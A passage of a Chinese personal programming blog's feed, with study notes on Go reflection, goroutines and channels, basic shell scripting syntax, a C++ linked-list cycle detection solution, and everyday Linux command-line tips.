class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;fmt&quot;</span><br>    <span class="hljs-string">&quot;reflect&quot;</span><br>)<br>     <br><span class="hljs-keyword">type</span> Person <span class="hljs-keyword">struct</span> &#123;<br>    Name <span class="hljs-type">string</span>  <span class="hljs-string">`info:&quot;name&quot; doc:&quot;我的名字&quot;`</span><br>    High <span class="hljs-type">float64</span> <span class="hljs-string">`info:&quot;high&quot;`</span><br>    Age  <span class="hljs-type">int</span>     <span class="hljs-string">`info:&quot;age&quot;`</span><br>&#125;<br>     <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">findTag</span><span class="hljs-params">(T any)</span></span> &#123;<br>    str := reflect.TypeOf(T)<br>    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; str.NumField(); i++ &#123;<br>        tag := str.Field(i).Tag<br>        fmt.Println(tag)<br>    &#125;<br>&#125;<br>     <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">var</span> person Person<br>    findTag(person)<br>&#125;<br></code></pre></td></tr></table></figure><p>​</p></li></ul></li></ol><p></p><h3 id="线程和协程"><a href="#线程和协程" class="headerlink" title="线程和协程"></a>线程和协程</h3><p>   <img src="https://go-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/image-20230622132047575.png"></p><ol><li><p>创建<code>goroutine</code>相当于创建一个线程</p><p>只用普通函数创建线程</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;fmt&quot;</span><br>    <span class="hljs-string">&quot;time&quot;</span><br>)<br>   <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">goRoutine</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++ &#123;<br>        fmt.Println(<span class="hljs-string">&quot;this is goroutine : &quot;</span>, i)<br>        time.Sleep(time.Second)<br>    &#125;<br>&#125;<br>   <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    i := <span class="hljs-number">0</span><br>    <span class="hljs-keyword">go</span> goRoutine()<br>    <span class="hljs-keyword">for</span> i &lt; <span class="hljs-number">10</span> &#123;<br>        fmt.Println(<span class="hljs-string">&quot;this is main : &quot;</span>, i)<br>        time.Sleep(<span class="hljs-number">1</span> * time.Second)<br>        i++<br>    &#125;<br>&#125;<br>   <br>   <br></code></pre></td></tr></table></figure><p>使用匿名函数创建线程</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">defer</span> fmt.Println(<span class="hljs-string">&quot;this is A.defer&quot;</span>)<br>i := <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i &lt; <span class="hljs-number">10</span> &#123;<br>i++<br>fmt.Println(<span class="hljs-string">&quot;this is goRoutine : &quot;</span>, i)<br>time.Sleep(<span class="hljs-number">1</span> * time.Second)<br>&#125;<br>fmt.Println(<span class="hljs-string">&quot;A&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>runtime.Goexit() <span class="hljs-comment">//退出当前的goroutine</span><br><span class="hljs-keyword">defer</span> fmt.Println(<span class="hljs-string">&quot;this is B.defer&quot;</span>)<br>fmt.Println(<span class="hljs-string">&quot;this is B&quot;</span>)<br>&#125;()<br>&#125;() <span class="hljs-comment">//加小括号是为了调用</span><br>    <br>    <br></code></pre></td></tr></table></figure></li><li><p>线程之间的沟通</p><ul><li><p>chan </p><p>使用chan 保持线程之间的联系，这个变量能够维持线程之间的秩序，保持main后退出。也就是说如果chan没有值，就会阻塞</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">defer</span> fmt.Println(<span class="hljs-string">&quot;main.defer&quot;</span>)<br>    <span class="hljs-keyword">var</span> c <span class="hljs-keyword">chan</span> any = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> any)<br>     <br>    <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>        <span class="hljs-keyword">defer</span> fmt.Println(<span class="hljs-string">&quot;A.defer&quot;</span>)<br>        c &lt;- <span class="hljs-number">888</span><br>    &#125;()<br>    g := &lt;-c<br>    fmt.Println(g)<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>无缓冲的chan</p><blockquote><p>当一个<code>goroutine</code>向无缓冲的<code>chan</code>发送数据时，如果没有其他<code>goroutine</code>正在等待接收数据，发送的<code>goroutine</code>会被阻塞，直到有其他<code>goroutine</code>准备好接收数据为止。同样地，当一个<code>goroutine</code>从无缓冲的<code>chan</code>接收数据时，如果没有其他<code>goroutine</code>正在等待发送数据，接收的<code>goroutine</code>也会被阻塞，直到有其他<code>goroutine</code>准备好发送数据为止。</p><p>无缓冲的<code>chan</code>可以用于实现两个<code>goroutine</code>之间的同步，确保在数据交换之前两个<code>goroutine</code>都准备好。它们可以用于控制并发的执行顺序，防止数据竞争和资源争用。</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>      <span class="hljs-keyword">defer</span> fmt.Println(<span class="hljs-string">&quot;main.defer&quot;</span>)<br>      <span class="hljs-keyword">var</span> c <span class="hljs-keyword">chan</span> any = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> any)<br>       <br>      <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>          <span class="hljs-keyword">defer</span> fmt.Println(<span class="hljs-string">&quot;A.defer&quot;</span>)<br>          c &lt;- <span class="hljs-number">888</span><br>      &#125;()<br>      g := &lt;-c<br>      fmt.Println(g)<br>  &#125;<br></code></pre></td></tr></table></figure></li><li><p>有缓冲的chan</p><blockquote><p>有缓冲的<code>chan</code>允许在发送（<code>chan &lt;- value</code>）和接收（<code>value &lt;- chan</code>）数据时不会立即发生阻塞，除非缓冲区已满或为空。当缓冲区未满时，发送操作会将数据放入缓冲区，并立即返回，而不会阻塞发送的<code>goroutine</code>。同样地，当缓冲区不为空时，接收操作会从缓冲区中取出数据，并立即返回，而不会阻塞接收的<code>goroutine</code>。</p><p>当缓冲区已满时，发送操作会导致发送的<code>goroutine</code>阻塞，直到有其他<code>goroutine</code>从缓冲区中取出数据为止。同样地，当缓冲区为空时，接收操作会导致接收的<code>goroutine</code>阻塞，直到有其他<code>goroutine</code>向缓冲区发送数据为止。</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs go">       <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">defer</span> fmt.Println(<span class="hljs-string">&quot;main 工作完毕&quot;</span>)<br>    c := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>        <span class="hljs-keyword">defer</span> fmt.Println(<span class="hljs-string">&quot;子线程工作完毕&quot;</span>)<br>        i := <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i &lt; <span class="hljs-number">4</span> &#123;<br>            i++<br>            c &lt;- i<br>            fmt.Println(<span class="hljs-string">&quot;子线程 传输元素为：&quot;</span>, i, <span class="hljs-string">&quot; len(c) &quot;</span>, <span class="hljs-built_in">len</span>(c), <span class="hljs-string">&quot; cap(c) &quot;</span>, <span class="hljs-built_in">cap</span>(c))<br>       <br>        &#125;<br>    &#125;()<br>    time.Sleep(time.Second * <span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++ &#123;<br>        num := &lt;-c<br>        fmt.Println(<span class="hljs-string">&quot;main 接收到元素为：&quot;</span>, num, <span class="hljs-string">&quot; len(c) &quot;</span>, <span class="hljs-built_in">len</span>(c), <span class="hljs-string">&quot; cap(c) &quot;</span>, <span class="hljs-built_in">cap</span>(c))<br>    &#125;<br>    time.Sleep(<span class="hljs-number">1</span> * time.Second)<br>&#125;<br>       <br></code></pre></td></tr></table></figure></li><li><p>关闭channel</p><p><img src="https://go-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/image-20230622150712214.png"></p></li><li><p>channel和range的关系</p><p><img src="https://go-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/image-20230622182950143.png"></p><p>也就是说我们可以使用<code>range</code>遍历<code>channel</code></p></li><li><p><code>channel</code>和<code>select</code></p><p>可以多路的监控<code>channel</code>状态</p><p><img src="https://go-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/image-20230623132432632.png"></p></li></ul></li></ul></li></ol><h2 id="GO"><a href="#GO" class="headerlink" title="GO"></a>GO</h2>]]></content>
    
    
    
    <tags>
      
      <tag>go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>shell</title>
    <link href="/2023/05/06/linux/shell/"/>
    <url>/2023/05/06/linux/shell/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h1><h2 id="运行方法"><a href="#运行方法" class="headerlink" title="运行方法"></a>运行方法</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">方法一  直接运行解释器</span><br>sh hello.sh<br><span class="hljs-meta prompt_">#</span><span class="language-bash">方法二  使用可执行文件</span><br>chmod +x hello.sh<br>./hello.sh<br></code></pre></td></tr></table></figure><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><ol><li><p>系统变量</p><p>系统变量有$HOME、$PWD、$USER等</p></li><li><p>自定义变量</p><ul><li><p>创建变量</p><p>变量名&#x3D;变量值，等号两侧不能有空格，变量名一般习惯用<strong>大写</strong>。</p></li><li><p>删除变量</p><p><code>unset 变量名</code></p></li><li><p>声明静态变量</p><p><code>readonly +变量名</code></p><p>静态变量不能unset</p></li><li><p>使用变量</p><p><code>$name</code></p></li></ul></li></ol><h3 id="将命令返回值赋给变量重点"><a href="#将命令返回值赋给变量重点" class="headerlink" title="将命令返回值赋给变量重点"></a>将命令返回值赋给变量重点</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">A=`ls`<br>A=$(ls)<br></code></pre></td></tr></table></figure><h3 id="shell环境变量"><a href="#shell环境变量" class="headerlink" title="shell环境变量"></a>shell环境变量</h3><ol><li>export 变量名&#x3D;变量值，将 Shell 变量输出为环境变量。</li><li>source 配置文件路径，让修改后的配置信息立即生效。</li><li>echo $变量名，检查环境变量是否生效。</li></ol><h3 id="位置参数"><a href="#位置参数" class="headerlink" title="位置参数"></a>位置参数</h3><h4 id="位置参数变量"><a href="#位置参数变量" class="headerlink" title="位置参数变量"></a>位置参数变量</h4><p><strong>基本语法</strong></p><ul><li>$n ：$0 代表命令本身、$1-$9 代表第1到9个参数，10以上参数用花括号，如 ${10}。</li><li>$* ：命令行中所有参数，且把所有参数看成一个整体。</li><li>$@ ：命令行中所有参数，且把每个参数区分对待。</li><li>$# ：所有参数个数。</li></ul><h3 id="预定义变量"><a href="#预定义变量" class="headerlink" title="预定义变量"></a>预定义变量</h3><p><strong>基本语法</strong></p><ul><li>$$ ：当前进程的 PID 进程号。</li><li>$! ：后台运行的最后一个进程的 PID 进程号。</li><li>$? ：最后一次执行的命令的返回状态，0为执行正确，非0执行失败。</li></ul><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><p><strong>基本语法</strong></p><ul><li>$((运算式)) 或 $[运算式]</li><li>expr m + n 注意 expr 运算符间要有空格</li><li>expr m - n</li><li>expr *，&#x2F;，% 分别代表乘，除，取余</li></ul><h3 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h3><p><code>[ condition ] </code>注意condition前后都要有空格</p><p>非空返回0，0为 true，否则为 false</p><p><code>if语句</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!bin/bash</span><br>Int1=1;<br>Int2=2;<br>if [ $Int1 == $Int2]<br>then<br>        echo &quot;等&quot;<br>else<br>        echo &quot;不相等&quot;<br>fi<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell">Int3=3;<br><br>if [ $Int3 -lt 0 ]<br>then<br>        echo &quot;&lt;0&quot;<br>elif [ $Int3 -lt 3 ]<br>then<br>        echo &quot;&lt;3&quot;<br>else<br>        echo &quot;&gt;=3&quot;<br>fi<br><span class="hljs-meta prompt_"># </span><span class="language-bash">注意-lt是小于的意思</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">-gt是大于的意思</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">-ge是大于等于</span><br></code></pre></td></tr></table></figure><p><code>case语句</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!bin/bash</span><br>case $1 in<br>        &quot;1&quot;)<br>                echo &quot;1&quot;<br>                ;;<br>        &quot;2&quot;)<br>                echo &quot;2&quot;<br>                ;;<br>        *)<br>                echo &quot;其他&quot;<br>                ;;<br>esac<br><br></code></pre></td></tr></table></figure><h3 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a><code>for</code>循环</h3><p><code>for循环</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">for i in &quot;$@&quot;<br>do<br>        echo &quot;$i  &quot;;<br>done<br>echo &quot;========&quot;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">结果：</span><br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>========<br></code></pre></td></tr></table></figure><p>由此可见，结果是竖着的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">for i in &quot;$*&quot;<br>do<br>        echo &quot;$i  &quot;;<br>done<br>echo &quot;========&quot;<br><br>1 2 3 4 5 6 7 8 9<br>========<br></code></pre></td></tr></table></figure><p>结果是横着的</p><p><code>C语言风格的for</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br><br>for ((i=0; i&lt;10; i++))<br>do<br>echo &quot;hahah&quot;<br>done<br></code></pre></td></tr></table></figure><p>使用<code>&#123;&#125;</code>的<code>for</code>循环</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!bin/bash</span><br><br>SUM=0<br><br>for i in &#123;1..100&#125;<br>do<br>        SUM=$(($SUM+$i))<br>done<br><br>echo $SUM<br></code></pre></td></tr></table></figure><p>使用<code>seq</code>的<code>for</code>循环</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!bin/bash</span><br><br>SUM=0<br><br>for i in $(seq 1 100)<br>do<br>        SUM=$(($SUM+$i))<br>done<br><br>echo $SUM<br></code></pre></td></tr></table></figure><p><code>while</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">i=0;<br>while [ $i -lt 10 ]<br>do<br>        echo $i<br>        i=$((i+1))<br>done<br><br></code></pre></td></tr></table></figure><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p><code>read -p &quot;输入一个数字:&quot;NUM</code></p><p><code>read -t &quot;在10秒中输入一个数&quot;NUM</code></p><p><code>read num</code>将值赋给<code>num</code></p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="编写"><a href="#编写" class="headerlink" title="编写"></a>编写</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">标准</span><br>function 函数名()&#123;<br>指令<br>return n<br>&#125;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">简写</span><br>function 函数名 &#123;<br>指令<br>return n<br>&#125;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">简写</span><br>函数名&#123;<br>指令<br>return n<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>程序执行的顺序</strong></p><p>系统别名-&gt;函数-&gt;系统命令-&gt;可执行文件</p><p><strong>其他知识点</strong></p><ol><li><p><code>return </code>是退出函数</p><p>exit 退出文件</p></li></ol><h4 id="调用"><a href="#调用" class="headerlink" title="调用"></a>调用</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">bash test1<br><span class="hljs-meta prompt_">#</span><span class="language-bash">与嗲用可执行文件一样</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>查看链表是否有环</title>
    <link href="/2023/05/01/%E7%AE%97%E6%B3%95/newcoder/%E6%9F%A5%E7%9C%8B%E9%93%BE%E8%A1%A8%E6%98%AF%E5%90%A6%E6%9C%89%E7%8E%AF/"/>
    <url>/2023/05/01/%E7%AE%97%E6%B3%95/newcoder/%E6%9F%A5%E7%9C%8B%E9%93%BE%E8%A1%A8%E6%98%AF%E5%90%A6%E6%9C%89%E7%8E%AF/</url>
    
    <content type="html"><![CDATA[<p>[题](<a href="https://www.nowcoder.com/practice/650474f313294468a4ded3ce0f7898b9?tpId=295&tqId=605&ru=/exam/oj&qru=/ta/format-top101/question-ranking&sourceUrl=/exam/oj?page=1&tab=%E7%AE%97%E6%B3%95%E7%AF%87&topicId=295">判断链表中是否有环_牛客题霸_牛客网 (nowcoder.com)</a>)</p><p><img src="https://newcode-1317182407.cos.ap-nanjing.myqcloud.com/%E9%93%BE%E8%A1%A8/%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E6%9C%89%E7%8E%AF.png"></p><ol><li><p>代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for singly-linked list.</span><br><span class="hljs-comment"> * struct ListNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     ListNode *next;</span><br><span class="hljs-comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">hasCycle</span><span class="hljs-params">(ListNode* head)</span> </span>&#123;<br>        ListNode* slow = head;<br>        ListNode* fast = head;<br>        <span class="hljs-keyword">while</span> (fast != <span class="hljs-literal">nullptr</span> &amp;&amp; fast-&gt;next != <span class="hljs-literal">nullptr</span>) &#123;<br>            fast = fast-&gt;next-&gt;next;<br>            slow = slow-&gt;next;<br>            <span class="hljs-keyword">if</span> (fast == slow) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>提示</p><ul><li>使用快慢指针，如果快指针与慢指针重合，则说明有环</li></ul></li><li><p>理解</p><p>- </p></li><li><p>问题</p><p>- </p><blockquote></blockquote></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>那些年刷过的算法题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用linux</title>
    <link href="/2023/04/30/linux/%E4%BD%BF%E7%94%A8linux/"/>
    <url>/2023/04/30/linux/%E4%BD%BF%E7%94%A8linux/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="使用Linux"><a href="#使用Linux" class="headerlink" title="使用Linux"></a>使用Linux</h1><h2 id="各类小技巧"><a href="#各类小技巧" class="headerlink" title="各类小技巧"></a>各类小技巧</h2><ol><li><p>强制停止</p><ul><li><p><code>Ctrl+c</code> 退出程序</p></li><li><p><code>Ctrl+c</code> 退出登出或退出</p></li></ul><p>  不能用于退出vi&#x2F;vim</p></li><li><p>历史命令查找</p><ul><li><p><code>history</code> </p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">history</span> | <span class="hljs-keyword">grep</span> ch<br></code></pre></td></tr></table></figure><p>过滤使用的指令里带有<code>ch</code>的命令</p></li><li><p><code>Ctrl+r</code> 输入内容匹配</p><p>如果搜索到的命令是可执行的，则直接回车</p><p>键盘的左右键，可以得到此命令</p></li><li><p><code>!</code> 匹配最近的</p><p>比如：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">!<span class="hljs-selector-tag">p</span><br></code></pre></td></tr></table></figure><p>匹配最近的p开头的命令</p></li></ul></li><li><p>光标移动</p><ul><li><code>Ctrl + a</code> 跳到命令开头</li><li><code>Ctrl + e</code> 跳到命令结尾</li><li><code>Ctrl + 左键</code> 向左跳过一个单词</li><li><code>Ctrl + 右键</code> 向右跳过一个单词</li></ul></li><li><p>清屏</p><ul><li><code>Ctrl + r</code>&#x2F;<code>clean</code></li></ul></li></ol><h2 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h2><h3 id="CentOs"><a href="#CentOs" class="headerlink" title="CentOs"></a><code>CentOs</code></h3><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/Linux/yum.png"></p><p><code>yum</code>指令 </p><h3 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a><code>Ubuntu</code></h3><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/Linux/apt.png"></p><h2 id="控制软件的启动和关闭"><a href="#控制软件的启动和关闭" class="headerlink" title="控制软件的启动和关闭"></a>控制软件的启动和关闭</h2><h3 id="systemctl"><a href="#systemctl" class="headerlink" title="systemctl"></a>systemctl</h3><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/Linux/systemctl.png"></p><p>控制系统的内置服务</p><p>手动添加第三方软件到<code>systemctl</code></p><h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p>在系统中创建软连接，可以直接将文件、文件夹放到其他位置，类似于win的快捷方式</p><h3 id="软链接"><a href="#软链接" class="headerlink" title="软链接"></a>软链接</h3><ol><li><p>语法：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ln</span> -s 参数<span class="hljs-number">1</span> 参数<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>参数1：被链接的文件或者文件夹</p><p>参数2：要链接的目的地</p></li></ol><h2 id="时间和时区"><a href="#时间和时区" class="headerlink" title="时间和时区"></a>时间和时区</h2><ol><li><p>语法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">data 